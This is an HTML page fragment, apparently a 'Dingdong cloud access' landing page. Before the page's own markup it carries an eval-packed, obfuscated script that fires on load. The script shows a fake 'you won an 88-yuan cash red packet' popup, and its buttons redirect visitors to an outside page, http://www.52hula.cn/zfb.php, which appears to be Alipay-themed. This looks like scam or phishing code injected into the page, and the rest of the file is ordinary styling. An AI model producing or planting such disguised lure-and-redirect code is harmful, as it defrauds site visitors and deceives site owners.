<style>
	*{margin: 0;padding: 0;}
	body{ background-color: #3A3A3A; }
	#main{position: absolute;width: 200px;left: 50%;margin-left: -100px;top:200px;text-align: center;}
	#main li{list-style-type: none;margin-top: 5px;}
	#main li a{color: #fff;}
	#main li a:hover{color: #99e;}
	#main li a:active{color: #e99;}
</style>
<link rel="stylesheet" href="/gg/simpleAlert.css">
<script src="/gg/jquery.min.js"></script>
<script src="/gg/simpleAlert.js"></script>
<script>
eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('3 9=m(2*o.n());p(!9){$(0(){3 1=8({"b":"a,5!","4":{"h":0(){1.g()}},"f":{"s":0(){7.6.c=\'j://i.k.l/e.d\'}}})})}r{$(0(){3 1=8({"b":"a,5!","4":{"q":0(){7.6.c=\'j://i.k.l/e.d\'}},"f":{"h":0(){1.g()}}})})}',29,29,'function|onlyChoseAlert||var|buttons|获得88元现金红包|location|window|simpleAlert|num_test|恭喜您|content|href|php|zfb|buttonss|close|拒绝|www|http|52hula|cn|parseInt|random|Math|if|领取红包|else|领取'.split('|'),0,{}))
</script>
<html>
<head>
<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0;" name="viewport" />
<meta charset="utf-8"> 
<script src="/css/jquery.min.js"></script>
<link href="/css/bootstrap.min.css" rel="stylesheet">
<script src="/css/bootstrap-theme.min.css"></script>
<script src="/css/bootstrap.min.js"></script>
<link rel="stylesheet" href="/css/font-awesome.min.css">
<title>叮咚云端访问</title>
<style>
body,html{
	background:#efefef;
	padding:0px;
	margin:0px;
	overflow-x:hidden;
}
a{ text-decoration:none} 
a:hover,a:link{ text-decoration:none} 
.main{
	margin:10px;
}
.list-group-item a{
	display:block;
}
.label-t{
	margin-bottom:20px;
}
.line{
	height:1px;
	background:#ccc;
}
.btn{
	border-radius: 0px;

}
</style></head>
<body>
